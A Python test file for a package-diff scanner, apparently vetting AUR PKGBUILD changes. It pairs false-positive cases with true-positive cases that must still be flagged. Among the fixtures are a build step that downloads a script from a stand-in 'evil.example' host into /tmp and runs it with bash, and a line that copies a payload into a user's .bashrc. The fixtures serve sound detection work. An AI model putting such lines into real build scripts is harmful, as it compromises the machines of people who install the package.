"""Malicious false positives from the 2026-11-14 watcher triage.

Each case pins the benign shape the rule misread and the true-positive twin
that must keep firing.  The benign false positives from the same window
(install hooks, SKIP checksums, same-version artifact swaps) are packager
practices, not rule changes, and are deliberately absent here.
"""

from __future__ import annotations

import sys
from pathlib import Path

_ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(_ROOT / "scripts"))
sys.path.insert(0, str(_ROOT))

from calibration_gates import shipped_config  # noqa: E402

from trustsight.analysis import scan_diff  # noqa: E402
from trustsight.config import load_config, load_rules  # noqa: E402


_HEAD = """pkgname=p
pkgver=1.0
pkgrel=1
source=('https://e.example/x.tar.gz')
sha256sums=('SKIP')
"""


def _ids(diff, current_text=None, package_name="p", manifest=None):
    with shipped_config():
        fact = scan_diff(
            diff, rules=load_rules(), config=load_config(),
            package_name=package_name, current_text=current_text,
            tree_manifest=manifest,
        )
    return {e.rule_id for e in fact.score_breakdown}


def _new_file(body: str, path: str = "PKGBUILD") -> str:
    lines = body.strip("\n").splitlines()
    added = "".join("+" + line + "\n" for line in lines)
    return (f"--- /dev/null\n+++ b/{path}\n"
            f"@@ -0,0 +1,{len(lines)} @@\n{added}")


# --- H081: a continued argument is not a command ---------------------------

_VTIVM_INSTALL = _HEAD + """
package() {
  install -Dm644 -t "$pkgdir/usr/share/licenses/$pkgname" \\
    "$srcdir/vtium/LICENSE" "$srcdir/vtium/COPYING"
}
"""


def test_h081_continuation_is_not_a_committed_execution():
    manifest = [("PKGBUILD", b"x"), ("LICENSE", b"x")]
    assert "H081" not in _ids(
        _new_file(_VTIVM_INSTALL), manifest=manifest)


def test_h081_still_fires_on_a_committed_script_at_command_position():
    body = _HEAD + """
package() {
  ./LICENSE --run
}
"""
    manifest = [("PKGBUILD", b"x"), ("LICENSE", b"x")]
    assert "H081" in _ids(_new_file(body), manifest=manifest)


# --- X011: opam --fake registers a system package, it runs nothing ---------

def test_x011_opam_fake_is_not_fetched_code():
    body = _HEAD + """
build() {
  opam install --switch=p --fake dune
}
"""
    assert "X011" not in _ids(_new_file(body))


def test_x011_still_fires_on_an_opam_registry_install():
    body = _HEAD + """
build() {
  opam install --switch=p evil-package
}
"""
    assert "X011" in _ids(_new_file(body))


# --- H077: the hunk may not carry the enclosing function header ------------

_PREPARE_RECIPE = """pkgname=p
prepare() {
  cd "$srcdir"
  cd third_party/rust
  cargo fetch --locked --target host-tuple
}
build() {
  make
}
"""

_TAIL_HUNK = """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -4,2 +4,3 @@
   cd third_party/rust
+  cargo fetch --locked --target host-tuple
 }
"""


def test_h077_fetch_inside_a_function_outside_the_hunk_is_not_parse_time():
    assert "H077" not in _ids(_TAIL_HUNK, current_text=_PREPARE_RECIPE)


def test_h077_still_fires_on_a_top_level_fetch():
    recipe = """pkgname=p
_ver=1.0
cargo fetch --locked --target host-tuple
"""
    diff = """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,2 +1,3 @@
 pkgname=p
 _ver=1.0
+cargo fetch --locked --target host-tuple
"""
    assert "H077" in _ids(diff, current_text=recipe)


# --- X005: a descriptor redirect to the null device is not a write ---------

def test_x005_defensive_home_string_in_a_grep_is_not_a_write():
    body = _HEAD + """
package() {
  if patchelf --print-rpath "$f" 2>/dev/null | grep -q '/home/runner/'; then
    patchelf --remove-rpath "$f"
  fi
}
"""
    assert "X005" not in _ids(_new_file(body))


def test_x005_still_fires_on_a_home_write():
    body = _HEAD + """
package() {
  cp payload /home/alice/.bashrc
}
"""
    assert "X005" in _ids(_new_file(body))


# --- H082: a system tool is not a fetched payload --------------------------

def test_h082_system_tool_after_a_package_manager_is_not_fetch_then_execute():
    body = _HEAD + """
prepare() {
  npx --yes web-ext build
}
build() {
  /usr/bin/vendor_perl/strip-nondeterminism -t 1 .
}
"""
    assert "H082" not in _ids(_new_file(body))


def test_h082_still_fires_on_a_downloaded_file_executed_from_tmp():
    body = _HEAD + """
build() {
  curl -o /tmp/payload.sh https://evil.example/x.sh
  bash /tmp/payload.sh
}
"""
    assert "H082" in _ids(_new_file(body))


# --- C001: compiling a declared source file is not a new capability --------

def _bump(extra: str, old: str = "a" * 64, new: str = "b" * 64) -> str:
    return ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,8 @@\n"
            " pkgname=p\n"
            " source=('https://e.example/x.tar.gz')\n"
            "-pkgver=1.0\n+pkgver=1.1\n"
            f"-sha256sums=('{old}')\n+sha256sums=('{new}')\n"
            + extra)


def test_c001_version_bump_that_compiles_the_declared_c_file_is_not_a_capability():
    extra = ("+build() {\n"
             "+  gcc $CFLAGS -o dsh-gtk dsh-gtk.c\n"
             "+}\n")
    assert "C001" not in _ids(_bump(extra))


def test_c001_still_fires_when_the_bump_adds_a_script_execution():
    extra = ("+build() {\n"
             "+  ./tools/stage.sh\n"
             "+}\n")
    assert "C001" in _ids(_bump(extra))


# --- C022: removing a redundant stronger digest is not a downgrade ---------

def test_c022_sha512_to_sha256_is_not_a_downgrade():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,2 @@\n"
            " pkgname=p\n"
            f"-sha512sums=('{'a' * 128}')\n"
            f" sha256sums=('{'b' * 64}')\n")
    assert "C022" not in _ids(diff)


def test_c022_sha256_to_md5_still_fires():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,2 @@\n"
            " pkgname=p\n"
            f"-sha256sums=('{'a' * 64}')\n"
            f" md5sums=('{'b' * 32}')\n")
    assert "C022" in _ids(diff)


# --- D002: a companion package that exists is not a typosquat --------------

def _added_dep_diff(name: str, dep: str) -> str:
    body = (f"pkgname={name}\npkgver=0.2.0\npkgrel=1\n"
            f"source=('https://github.com/u/{name}/archive/v0.2.0.tar.gz')\n"
            f"sha256sums=('{'0' * 64}')\n"
            f"depends=('{dep}')\n")
    return _new_file(body)


def _patch_dep_corpus(monkeypatch, known):
    monkeypatch.setattr(
        "trustsight.analysis.dependencies.is_established_package",
        lambda name: False,
    )
    monkeypatch.setattr(
        "trustsight.analysis.dependencies.dependency_table_populated",
        lambda: True,
    )
    monkeypatch.setattr(
        "trustsight.analysis.dependencies.is_dependency_novel",
        lambda name: True,
    )
    monkeypatch.setattr(
        "trustsight.analysis.dependencies.top_dependency_names",
        lambda: ["waybar"],
    )
    monkeypatch.setattr(
        "trustsight.db.is_known_aur_package",
        lambda name: name in known,
    )


def test_d002_known_aur_companion_is_not_a_typosquat(monkeypatch):
    _patch_dep_corpus(monkeypatch, {"waymobar"})
    assert "D002" not in _ids(_added_dep_diff("rivermonad", "waymobar"))


def test_d002_still_fires_on_an_unknown_lookalike(monkeypatch):
    _patch_dep_corpus(monkeypatch, set())
    assert "D002" in _ids(_added_dep_diff("rivermonad", "waymobar"))


def test_d001_known_aur_package_is_not_novel(monkeypatch):
    _patch_dep_corpus(monkeypatch, {"shotlet"})
    assert "D001" not in _ids(_added_dep_diff("rivermonad", "shotlet"))


def test_is_known_aur_package_reads_the_packages_table():
    from trustsight import db

    db.init_db()
    try:
        assert db.is_known_aur_package("triage-known-aur-test") is False
        db.upsert_package("triage-known-aur-test", "1.0")
        assert db.is_known_aur_package("triage-known-aur-test") is True
    finally:
        db.forget_package("triage-known-aur-test")


# --- D005/H064: a declared replacement is not a name shadow ----------------

def _shadow_diff(claims: str) -> str:
    body = (f"pkgname=kenning\npkgver=0.8.1\npkgrel=1\n"
            f"source=('https://e.example/x.tar.gz')\n"
            f"sha256sums=('{'0' * 64}')\n" + claims)
    return _new_file(body)


def _patch_established(monkeypatch, names):
    monkeypatch.setattr(
        "trustsight.analysis.dependencies.is_established_package",
        lambda name: name in names,
    )
    monkeypatch.setattr(
        "trustsight.analysis.dependencies.dependency_observation_count",
        lambda name: 10_000 if name in names else 0,
    )


def test_d005_declared_replacement_conflict_is_not_a_shadow(monkeypatch):
    _patch_established(monkeypatch, {"plasma-login-manager"})
    ids = _ids(_shadow_diff(
        "provides=('plasma-login-manager=6.8.2')\n"
        "conflicts=('plasma-login-manager')\n"
    ), package_name="kenning")
    assert "D005" not in ids


def test_h064_conflict_alone_is_unscored(monkeypatch):
    _patch_established(monkeypatch, {"acestream-engine"})
    with shipped_config():
        fact = scan_diff(
            _shadow_diff("conflicts=('acestream-engine')\n"),
            rules=load_rules(), config=load_config(),
            package_name="outpace-bin",
        )
    entry = next(e for e in fact.score_breakdown if e.rule_id == "H064")
    assert entry.severity == "INFO"
    assert entry.weight == 0


def test_h064_provides_claim_on_the_same_name_still_scores(monkeypatch):
    _patch_established(monkeypatch, {"acestream-engine"})
    with shipped_config():
        fact = scan_diff(
            _shadow_diff("provides=('acestream-engine')\n"),
            rules=load_rules(), config=load_config(),
            package_name="outpace-bin",
        )
    entry = next(e for e in fact.score_breakdown if e.rule_id == "H064")
    assert entry.severity == "HIGH"
    assert entry.weight > 0
